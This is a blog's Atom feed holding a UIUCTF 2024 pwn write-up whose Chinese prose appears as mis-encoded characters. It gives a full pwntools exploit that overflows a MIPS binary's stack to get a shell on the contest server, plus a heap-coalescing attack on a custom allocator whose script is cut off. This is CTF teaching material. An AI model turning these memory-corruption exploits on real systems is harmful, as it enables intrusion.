<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BeaCox</title>
  
  <subtitle>On the way to be a hacker</subtitle>
  <link href="https://blog.beacox.space/atom.xml" rel="self"/>
  
  <link href="https://blog.beacox.space/"/>
  <updated>2024-07-07T11:30:00.000Z</updated>
  <id>https://blog.beacox.space/</id>
  
  <author>
    <name>BeaCox</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>UIUCTF 2024 PWN Writeup</title>
    <link href="https://blog.beacox.space/posts/uiuctf-2024-wp/"/>
    <id>https://blog.beacox.space/posts/uiuctf-2024-wp/</id>
    <published>2024-07-07T11:30:00.000Z</published>
    <updated>2024-07-07T11:30:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘å’Œ <a href="https://x.com/l3akctf">L3ak</a> ä¸€èµ·å‚åŠ äº†ä»Šå¹´çš„ <a href="https://2024.uiuc.tf/">UIUCTF</a>ï¼Œæœ€ç»ˆæˆ‘ä»¬æ’åœ¨ç¬¬7ã€‚æˆ‘åªåšäº† Pwn é¢˜ï¼Œæˆ‘ä»¬é˜Ÿæœ€ç»ˆä¹Ÿ AK äº† Pwnï¼Œ<a href="https://x.com/minatotw_">MinatoTW</a> is goatğŸ! </p><p>æœ¬æ–‡æ˜¯æ¯”èµ›ä¸­æ‰€æœ‰ Pwn é¢˜ï¼ˆé™¤äº†ä¸€é“ Pwn+Rev ä»¥å¤–ï¼‰çš„ Writeupã€‚</p><p><a href="https://gist.github.com/BeaCox/693563583377a778ba5b5fc98387b2d4">Engllish Writeup</a></p><h2 id="Backup-Power"><a href="#Backup-Power" class="headerlink" title="Backup Power"></a>Backup Power</h2><h3 id="æ¦‚å†µ"><a href="#æ¦‚å†µ" class="headerlink" title="æ¦‚å†µ"></a>æ¦‚å†µ</h3><blockquote><p>Can you turn on the backup generator for the SIGPwny Transit Authority?</p><p>75 solves</p></blockquote><p>è¿™é“é¢˜æ˜¯ MinatoTW è§£å‡ºæ¥çš„ï¼Œæˆ‘åªæ˜¯åœ¨èµ›åå¤ç°å¹¶æ’°å†™ wpã€‚</p><p><code>checksec</code> ç»“æœï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     mips-32-big</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></tbody></table></figure><p>è¿™æ˜¯ä¸€é“ mips æ¶æ„çš„æ ˆæº¢å‡ºé¢˜ã€‚æˆ‘ç”¨<code>qemu-mips</code>å»è¿è¡Œï¼Œç”¨<code>gdb-multiarch</code>è°ƒè¯•ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç¨‹åºçš„ä¸»è¦é€»è¾‘æ˜¯ï¼š</p><ul><li><p>é<code>developer</code>ï¼ˆ<code>developer</code>?<code>develper</code>?<code>devolper</code>? ä¸€ä¸ªç¨‹åºå‡ºç°ä¸‰ç§æ‹¼å†™ XDï¼‰ç”¨æˆ·åªè¢«å…è®¸æ‰§è¡Œ<code>shutdown</code>å’Œ<code>shutup</code>å‘½ä»¤ï¼Œæ²¡æœ‰å¯åˆ©ç”¨ä¹‹å¤„ã€‚</p></li><li><p>ç™»å½•ä¸º<code>developer</code>ç”¨æˆ·ï¼Œ<code>command</code>ä¼šè¢«è®¾ç½®ä¸º<code>todo</code>ã€‚è°ƒç”¨<code>develper_power_management_portal()</code>å‡½æ•°åå›åˆ°å¯¹å‘½ä»¤è¿›è¡Œåˆ¤æ–­çš„æµç¨‹ã€‚å…¶ä¸­ï¼Œ<code>develper_power_management_portal()</code>å‡½æ•°ä¸­è°ƒç”¨<code>gets()</code>å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">develper_power_management_portal</span><span class="params">(<span class="type">int</span> cfi)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">4</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> vars20; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">  <span class="keyword">if</span> ( vars20 != cfi )</span><br><span class="line">    _stack_chk_fail_local();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>å¦‚æœ<code>command</code>ä¸º<code>system</code>ï¼Œåˆ™ç¨‹åºä¼šæ‹¼æ¥æ ˆä¸Šå˜é‡ä½œä¸º<code>system()</code>å‡½æ•°çš„å‚æ•°å¹¶æ‰§è¡Œï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, system_str) )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">sprintf</span>(command_buf, <span class="string">"%s %s %s %s"</span>, arg1, arg2, arg3, arg4);</span><br><span class="line">  system(command_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>åœ¨è°ƒç”¨<code>develper_power_management_portal()</code>å‡½æ•°å‰åï¼Œç¨‹åºè¯•å›¾é€šè¿‡å¯„å­˜å™¨æ¥å¤‡ä»½æ ˆä¸Šå˜é‡çš„å€¼ï¼š</p><p><img src="https://bu.dusays.com/2024/07/06/6689647325ffb.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/06/6689647325ffb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="backup"></p><p>ä½†æ˜¯åœ¨<code>develper_power_management_portal()</code>å‡½æ•°ä¸­ï¼Œç¨‹åºåˆåœ¨è°ƒç”¨<code>gets()</code>å‡½æ•°ä¹‹åå°†å¯„å­˜å™¨çš„å€¼è®¾ç½®ä¸ºæ ˆä¸Šçš„å€¼ï¼š</p><p><img src="https://bu.dusays.com/2024/07/06/6689648a4c273.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/06/6689648a4c273.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ruin"></p><p>å› æ­¤æ²¡æœ‰èµ·åˆ°å¤‡ä»½çš„æ•ˆæœï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºåˆ°<code>0x24+var_sC($sp), 0x24+var_s10($sp), ...</code>æ¥è®¾ç½®<code>s4, s5, s6, s7</code>ä»è€Œè®¾ç½®<code>arg1, arg2, arg3, arg4</code>ã€‚</p></li></ul><p>è‡³æ­¤ï¼Œæˆ‘ä»¬çš„è§£é¢˜è·¯çº¿å¯ä»¥å½’çº³ä¸ºï¼šåˆ©ç”¨æ ˆæº¢å‡ºè®¾ç½®<code>command</code>ä¸º<code>system</code>ï¼Œå¹¶è®¾ç½®<code>arg1</code>ä¸º<code>sh;\x00</code>ï¼Œä½¿å¾—ç¨‹åºæ‰§è¡Œ<code>system("sh")</code>ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ç¨‹åºå¼€å¯äº†<code>cfi</code>æ ¡éªŒï¼Œå³åœ¨<code>develper_power_management_portal()</code>å‡½æ•°è¿”å›æ—¶ï¼Œä¼šæ£€æŸ¥å…¶è¿”å›åœ°å€æœ‰æ²¡æœ‰è¢«ä¿®æ”¹ã€‚åœ¨è¿™é¢˜ä¸­æˆ‘ä»¬ä¸éœ€è¦åŠ«æŒæ§åˆ¶æµï¼Œå› æ­¤å°†è¿”å›åœ°å€ä¿æŒåŸçŠ¶å³å¯ã€‚</p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>ä½¿ç”¨ <code>qemu-mips</code>å¯åŠ¨ç¨‹åºå¹¶ç­‰å¾…<code>gdb</code>è¿œç¨‹è°ƒè¯•ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mips -g 1234 ./backup-power</span><br></pre></td></tr></tbody></table></figure><p>åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­å¯åŠ¨<code>gdb-multiarch</code>å¹¶è¿œç¨‹è°ƒè¯•ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./backup-power</span><br><span class="line"></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="built_in">arch</span> mips</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian big</span><br><span class="line">pwndbg&gt; target remote :1234</span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥é€šè¿‡ gdb è°ƒè¯•æ¥å®šä½æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„å˜é‡åœ¨æ ˆä¸Šçš„ä½ç½®ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400ee8</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></tbody></table></figure><p>è¾“å…¥ç”¨æˆ·å<code>devolper</code>ï¼Œå†è¾“å…¥<code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa</code>è®©<code>gets()</code>æ¥æ”¶ï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼š</p><p><img src="https://bu.dusays.com/2024/07/03/66856156f10e3.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/03/66856156f10e3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="args"></p><p><img src="https://bu.dusays.com/2024/07/03/6685632ac71c6.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/03/6685632ac71c6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="stack"></p><p>å°†<code>command</code>è¦†ç›–ä¸º<code>system</code>ï¼Œ<code>arg1</code>è¦†ç›–ä¸º<code>sh;\x00</code>ï¼Œæ ˆä¸ŠåŒ…å«ç¨‹åºåœ°å€å¤„å°½é‡ä¿æŒåŸæ ·å³å¯ã€‚</p><p>å€¼å¾—æ³¨æ„çš„ä¸¤ä¸ªåœ°æ–¹ï¼š</p><ol><li>è¿”å›åœ°å€ï¼šä¸Šå›¾ä¸­ç¬¬äºŒä¸ª<code>0x400b0c</code>ã€‚ç”±äºå¼€å¯<code>cfi</code>ï¼Œè¿”å›åœ°å€å¿…é¡»ä¿æŒåŸæ ·ã€‚</li><li><code>gp</code>å¯„å­˜å™¨ï¼šä¸Šå›¾ä¸­<code>0x4aa30</code>ä¼šè¢«å­˜å…¥<code>gp</code>å¯„å­˜å™¨ï¼Œä¹‹åä¼šç”¨äºè®¡ç®—å‡½æ•°åç§»é‡ï¼Œå› æ­¤ä¸èƒ½ä¿®æ”¹ã€‚</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./backup-power"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"backup-power.chal.uiuc.tf"</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b"Username: "</span>, <span class="string">b'devolper'</span>)</span><br><span class="line">    payload = <span class="string">b"A"</span> * <span class="number">24</span> + <span class="string">b"sh;\x00"</span>.ljust(<span class="number">12</span>, <span class="string">b"A"</span>) + p32(<span class="number">0xdeadbeef</span>) * <span class="number">2</span> + p32(<span class="number">0x400b0c</span>)</span><br><span class="line"></span><br><span class="line">    sp = (</span><br><span class="line">        p32(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">        + p32(<span class="number">0x004AA330</span>)                       <span class="comment"># that's gp, we need to keep it</span></span><br><span class="line">        + p32(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">        + <span class="string">b"devolper"</span>.ljust(<span class="number">100</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">        + <span class="string">b"devolper"</span>.ljust(<span class="number">100</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">        + <span class="string">b"system\x00"</span>                         <span class="comment"># overwrite command to system</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    payload += sp</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><h2 id="pwnymalloc"><a href="#pwnymalloc" class="headerlink" title="pwnymalloc"></a>pwnymalloc</h2><h3 id="æ¦‚å†µ-1"><a href="#æ¦‚å†µ-1" class="headerlink" title="æ¦‚å†µ"></a>æ¦‚å†µ</h3><blockquote><p>iâ€™m tired of hearing all your complaints. pwnymalloc never complains.</p><p>65 Solves</p></blockquote><p>è¿™é“é¢˜æ˜¯èµ›ä¸­å’Œé˜Ÿå‹å…±åŒè§£å‡ºæ¥çš„ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™æ˜¯ä¸€é“å †é¢˜ï¼Œä½†æ˜¯å †ç®¡ç†å™¨æ˜¯è‡ªå®šä¹‰çš„ã€‚</p><p>ç¨‹åºçš„åŸºæœ¬åŠŸèƒ½ä¸ºï¼š</p><ol><li>æäº¤ç”³è¯‰ï¼ˆç”³è¯·å¯ç”¨å¤§å°ä¸º0x48çš„å †å—ï¼Œè¾“å…¥å†…å®¹ï¼Œå †å—å†…å®¹è¢«æ¸…é›¶ï¼Œå †å—è¢«é‡Šæ”¾ï¼‰</li><li>æŸ¥çœ‹ç”³è¯‰ï¼ˆæ‘†è®¾ï¼Œæ²¡æœ‰å®é™…å®ç°ï¼‰</li><li>ç”³è¯·é€€æ¬¾ï¼ˆç”³è¯·å¯ç”¨å¤§å°ä¸º0x88çš„å †å—ï¼Œç”¨äºå­˜æ”¾<code>refund_request</code>ç»“æ„ä½“ï¼Œä¸èƒ½è¢«ç›´æ¥<code>free</code></li><li>æŸ¥è¯¢é€€æ¬¾çŠ¶æ€ï¼ˆçŠ¶æ€ä¸º<code>REFUND_APPROVED</code>æ—¶ä¼šæ‰“å° flag ï¼‰</li></ol><p><code>refund_request</code>ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">refund_request</span> {</span></span><br><span class="line">    <span class="type">refund_status_t</span> status;</span><br><span class="line">    <span class="type">int</span> amount;</span><br><span class="line">    <span class="type">char</span> reason[<span class="number">0x80</span>];</span><br><span class="line">} <span class="type">refund_request_t</span>;</span><br></pre></td></tr></tbody></table></figure><p>ç”³è¯·é€€æ¬¾å‡½æ•°ä¼šå°†<code>status</code>è®¾ç½®ä¸º0å³<code>REFUND_DENIED</code>ï¼Œå¦ä¸€ä¸ªçŠ¶æ€æ˜¯1å³<code>REFUND_APPROVED</code>ï¼Œ<code>amount</code>å’Œ<code>reason</code>éƒ½ç”±ç”¨æˆ·è¾“å…¥ã€‚æ²¡æœ‰ä»»ä½•å¸¸è§„åŠŸèƒ½èƒ½ç›´æ¥å°†ç»“æ„ä½“çš„<code>status</code>è®¾ç½®ä¸º<code>REFUND_APPROVED</code>ï¼Œå› æ­¤éœ€è¦è€ƒè™‘åˆ©ç”¨è‡ªå®šä¹‰çš„å †ç®¡ç†å™¨æ¥å®Œæˆå¯¹è¯¥å­—æ®µçš„ä¿®æ”¹ã€‚</p><p>ç”±äºå †å—éœ€è¦0x10å­—èŠ‚å¯¹é½ï¼Œå› æ­¤å †å—çš„ç»“æ„å¯èƒ½å­˜åœ¨ä¸‹é¢ä¸¤ç§æƒ…å†µï¼š</p><p><img src="https://bu.dusays.com/2024/07/04/6686a5e8e217a.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/04/6686a5e8e217a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="chunk"></p><p>å½“å †å—å¯ç”¨å¤§å°ä¸º0xâ€¦8å­—èŠ‚æ—¶ï¼Œç”¨æˆ·å¯ç”¨å†™åˆ°<code>btag</code>æ‰€åœ¨çš„8å­—èŠ‚ã€‚æ­£å¸¸æƒ…å†µä¸‹åªæœ‰è¢«<code>free</code>çš„å †å—æ‰ä¼šè®¾ç½®<code>btag</code>ï¼Œè¿™ä¹Ÿæ˜¯é—®é¢˜æ‰€åœ¨: é¢˜ç›®ä¸­çš„å †å—å¯ç”¨å¤§å°éƒ½æ˜¯0xâ€¦8å­—èŠ‚ï¼Œè€Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥æ§åˆ¶<code>btag</code>çš„å€¼ã€‚</p><p>å †ç®¡ç†å™¨ä¸­ç©ºé—²å—åˆå¹¶çš„ä»£ç å¯¹æˆ‘æ¥è¯´æ¯”è¾ƒæœ‰è¶£ï¼ˆæ ¹æ®<code>unsorted bin</code>çš„ç»éªŒï¼‰ã€‚ç®€å•æ¥è¯´ï¼Œåœ¨<code>free</code>ä¸€ä¸ªå †å—æˆ–è€…æ‹†åˆ†ä¸€ä¸ªå¤§çš„å †å—æ—¶ï¼Œä¼šè°ƒç”¨<code>coalesce()</code>åˆå¹¶ç©ºé—²å—ï¼›è¯¥å‡½æ•°ä¼šæ£€æŸ¥å‰ä¸€ä¸ªå’Œåä¸€ä¸ªå †å—çš„å¤§å°ã€çŠ¶æ€æ¥å†³å®šæ˜¯å¦åˆå¹¶ã€‚</p><p>ä»¥åˆå¹¶å‰å‘å—ä¸ºä¾‹ï¼Œæœ‰å¦‚ä¸‹è°ƒç”¨é“¾</p><p><code>coalesce()-&gt;prev_chunk()-&gt;get_prev_size()</code>ï¼Œ<code>get_prev_size()</code>å‡½æ•°å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">get_prev_size</span><span class="params">(chunk_ptr block)</span> {</span><br><span class="line">    <span class="type">btag_t</span> *prev_footer = (<span class="type">btag_t</span> *) ((<span class="type">char</span> *) block - BTAG_SIZE);</span><br><span class="line">    <span class="keyword">return</span> prev_footer-&gt;size;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>å…¶ä¸­<code>btag</code>å¦‚å‰æ–‡æ‰€ç¤ºä½äºæ¯ä¸ªå †å—çš„æœ€å8å­—èŠ‚ï¼Œå †ç®¡ç†å™¨é€šè¿‡è¯¥å€¼åˆ¤æ–­å‰å‘ç©ºé—²å †å—çš„å¤§å°ã€‚å¦‚æœå‰å‘å †å—æœªè¢«<code>free</code>ï¼Œæ­£å¸¸æƒ…å†µä¸‹<code>get_prev_size</code>åº”å½“è¿”å›0ã€‚ä½†å¦‚æœæˆ‘ä»¬å°†<code>btag</code>å€¼è®¾ç½®ä¸ºæŸä¸€ä¸ªæ­£æ•°ï¼Œå †ç®¡ç†å™¨ä¼šæ ¹æ®è¿™ä¸ªå€¼å»å®šä½å‰å‘å †å—çš„<code>size | status</code>ï¼Œè¿›ä¸€æ­¥åˆ¤æ–­å…¶æ˜¯å¦è¢«<code>free</code>ã€‚é€šè¿‡æ„é€  payloadï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ä¿®æ”¹æŸä¸ªå †å—çš„<code>btag</code>ï¼Œå¹¶åœ¨ç›®æ ‡<code>size | status</code>å¤„å¡«å……æ°å½“çš„å€¼ï¼Œè¯±å¯¼å †ç®¡ç†å™¨å¯¹å‰å‘çš„æŸä¸€ç‰‡è¿ç»­çš„å†…å­˜ç©ºé—´è¿›è¡Œåˆå¹¶ï¼Œä¸è®ºè¿™ç‰‡å†…å­˜ç©ºé—´å¤„äºä»€ä¹ˆæ ·çš„ä½¿ç”¨çŠ¶æ€ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>æ¢³ç†ä¸€ä¸‹æˆ‘ä»¬çš„æ”»å‡»æ€è·¯ï¼š</p><ol><li><p>é€šè¿‡ç”³è¯·é€€æ¬¾åŠŸèƒ½ç”³è¯·2ä¸ªå †å—ï¼ˆå¤§å°éƒ½ä¸º0x90ï¼‰</p></li><li><p>å°†ç¬¬äºŒä¸ªå †å—ä½œä¸ºç›®æ ‡ï¼ˆå…¶é€€æ¬¾çŠ¶æ€ä¼šè¢«æ”¹å†™ï¼‰</p></li><li><p>åœ¨ç¬¬äºŒä¸ªå †å—çš„æœ€å8å­—èŠ‚å†™ä¸€ä¸ªæ¯”0x90å¤§çš„<code>size</code>ä½œä¸º<code>btag</code>ï¼ˆå¦‚0xb0ï¼‰</p></li><li><p>åœ¨ç¬¬ä¸€ä¸ªå †å—ä¸­é—´ç›¸åº”çš„ä½ç½®ï¼ˆ<code>chunk2_addr + 0x90 - 0xb0</code>ï¼‰å†™ä¸Šå¯¹åº”çš„<code>size | status</code>ï¼ˆå¦‚<code>0xb0 | 0</code>ï¼Œè¡¨ç¤ºè¢«freeï¼‰<br>æ­¤æ—¶å †å—çŠ¶æ€ï¼š</p><p><img src="https://bu.dusays.com/2024/07/04/6686af09c9dc0.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/04/6686af09c9dc0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1"></p></li><li><p>æäº¤ç”³è¯‰ï¼Œè§¦å‘ç©ºé—²å—åˆå¹¶ï¼Œä¼šåˆå¹¶å‡ºä¸€ä¸ªå¤§å°ä¸º<code>0xb0+0x50</code>çš„ç©ºé—²å †å—ï¼Œèµ·å§‹åœ°å€ä¸º<code>chunk2_addr + 0x90 - 0xb0</code></p><p><img src="https://bu.dusays.com/2024/07/04/6686b251a012a.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/04/6686b251a012a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2"></p></li><li><p>å†è°ƒç”¨ç”³è¯·é€€æ¬¾å‡½æ•°ï¼Œæ­¤æ—¶ç”³è¯·åˆ°çš„å †å—èµ·å§‹åœ°å€ä¸º<code>chunk2_addr + 0x90 - 0xb0</code>ï¼Œå¤§å°ä¸º0x90</p></li><li><p>è¿™ä¸ªå †å—æ¨ªè·¨ç¬¬ä¸€ä¸ªå †å—å’Œç¬¬äºŒä¸ªå †å—ï¼Œå¡«å……åˆé€‚çš„<code>payload</code>å¯ä»¥å°†ç¬¬äºŒä¸ªå †å—ä¸­çš„<code>refund_request-&gt;status</code>å†™ä¸º1å³<code>REFUND_APPROVED</code></p><p><img src="https://bu.dusays.com/2024/07/04/6686b34c90134.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/04/6686b34c90134.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="3"></p></li><li><p>è°ƒç”¨æ£€æŸ¥é€€æ¬¾çŠ¶æ€å‡½æ•°ï¼Œè·å¾— flag</p></li></ol><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>æˆ‘ä»¬ä¼ªé€ äº†ä¸€ä¸ªå¤§å°ä¸º0xb0çš„ç©ºé—²å †å—ï¼Œè¦æ³¨æ„åœ¨åˆå¹¶ç©ºé—²å—æ—¶ä¼šè°ƒç”¨<code>free_list_remove(prev_block)</code>ï¼Œå› æ­¤è¦è®©è¯¥å‡å †å—çš„<code>next</code>å’Œ<code>prev</code>æŒ‡é’ˆä¸º0ï¼ˆæˆ–åˆæ³•åœ°å€ï¼‰ï¼Œå¦åˆ™ä¼šå‡ºç°å†…å­˜è®¿é—®çš„é”™è¯¯ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./chal"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span 